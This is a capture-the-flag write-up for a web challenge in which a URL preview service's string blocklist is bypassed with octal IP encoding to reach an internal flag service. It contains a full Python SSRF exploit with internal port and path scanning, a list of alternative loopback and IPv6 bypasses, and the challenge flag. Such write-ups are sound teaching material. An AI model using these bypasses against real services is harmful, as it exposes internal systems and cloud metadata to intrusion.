---
title: "SSRFception"
ctf: "CyberStrike"
date: 2026-07-10
category: web
difficulty: very-hard
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# SSRFception

## Summary

A Flask URL preview service fetches arbitrary URLs but blocks internal addresses via a string-based blocklist (`127.0.0.1`, `localhost`, `0.0.0.0`, `::1`, `169.254.169.254`, etc.). The blocklist matches literal strings, but the Python `requests` library passes the hostname to glibc's `getaddrinfo()`, which resolves octal/hex IP encodings. Using `0177.0.0.1` (octal for `127.0.0.1`) bypasses the filter while still resolving to loopback. An internal flag service runs on port `8080` at `/secret`.

## Solution

### Step 1: Recon — understand the blocklist

The main page shows the blocked patterns explicitly:

```
Blocked patterns: localhost, 127.0.0.1, 0.0.0.0, internal, ::1, [::1],
metadata.google.internal, 169.254.169.254
```

The `/preview` endpoint accepts `POST` with a `url` parameter and fetches it server-side. Normal URLs work; `127.0.0.1` is blocked with `BLOCKED: That address is not allowed.`

### Step 2: Bypass the blocklist with octal IP encoding

The filter checks the URL string for literal matches like `127.0.0.1`. But glibc's `getaddrinfo()` accepts octal octets: `0177` = `127` in octal. So `0177.0.0.1` bypasses the string check but resolves to `127.0.0.1`.

```python
#!/usr/bin/env python3
"""SSRFception — octal IP encoding blocklist bypass."""
import requests
import re
import html as hmod

BASE = "http://chal.csc-snist.live:46280"

def preview(url):
    r = requests.post(f"{BASE}/preview", data={"url": url}, timeout=10)
    matches = re.findall(r'class="(result|blocked)"[^>]*>(.*?)</div>', r.text, re.DOTALL)
    for cls, raw in matches:
        return cls, hmod.unescape(raw.strip())
    return "none", ""

# Step 1: Confirm bypass works (not blocked, but connection refused on port 80)
cls, content = preview("http://0177.0.0.1/")
print(f"Bypass test: [{cls}] {content[:100]}")
# -> [result] Error fetching URL: ... Failed to establish a new connection
# (not BLOCKED — the filter was bypassed!)

# Step 2: Scan internal ports for the flag service
for port in [80, 5000, 8000, 8080, 3000, 9000]:
    cls, content = preview(f"http://0177.0.0.1:{port}/")
    if content and "Max retries" not in content:
        print(f"  Port {port} has a service! [{cls}] {content[:200]}")

# Step 3: Scan paths on port 8080
for path in ["/", "/flag", "/flag.txt", "/admin", "/secret", "/internal", "/api/flag"]:
    cls, content = preview(f"http://0177.0.0.1:8080{path}")
    if content and "Max retries" not in content:
        print(f"  :8080{path} -> [{cls}] {content}")

# Flag is at http://0177.0.0.1:8080/secret
cls, flag = preview("http://0177.0.0.1:8080/secret")
print(f"\nFLAG: {flag}")
```

### Step 3: Run the exploit

```bash
python3 ssrfception_exploit.py
# Bypass test: [result] Error fetching URL: ... (not BLOCKED — bypass works!)
#   Port 8080 has a service!
#   :8080/secret -> [result] cyberstrike{62a5a186c0b3fc1bf35fff9f6c166e83}
#
# FLAG: cyberstrike{62a5a186c0b3fc1bf35fff9f6c166e83}
```

## Flag

```
cyberstrike{62a5a186c0b3fc1bf35fff9f6c166e83}
```

## Notes

- **Blocklist bypass**: The filter checks for literal string matches (`127.0.0.1`, `localhost`, `0.0.0.0`, `::1`, `169.254.169.254`, etc.) against the URL. Using `0177.0.0.1` (octal encoding where `0177` = `127`) evades the string check because `0177.0.0.1` ≠ `127.0.0.1` as a string. But glibc's `getaddrinfo()` parses octal octets and resolves it to `127.0.0.1`.
- **Other bypasses that work**: `127.0.0.2` (different loopback address, not in blocklist), `127.1` (short form), `0x7f.0.0.1` (hex first octet). However, `requests` passes these to `getaddrinfo()` which may or may not resolve them depending on the OS. The octal form `0177.0.0.1` is the most reliable.
- **Internal service**: An HTTP service runs on `127.0.0.1:8080` inside the container with the flag at `/secret`. The main Flask app listens on port 46280 (proxied). The internal service is only accessible from localhost.
- **Alternative bypasses not needed**: DNS rebinding (using a domain that resolves to 127.0.0.1), URL redirect (using a URL that 302-redirects to 127.0.0.1), and IPv6-mapped IPv4 (`[::ffff:127.0.0.1]`) were all viable but the octal encoding was simplest. `[::ffff:127.0.0.1]` was blocked because it contains the string `127.0.0.1`, but `[0:0:0:0:0:ffff:7f00:1]` bypassed the filter (though the internal service was IPv4-only).
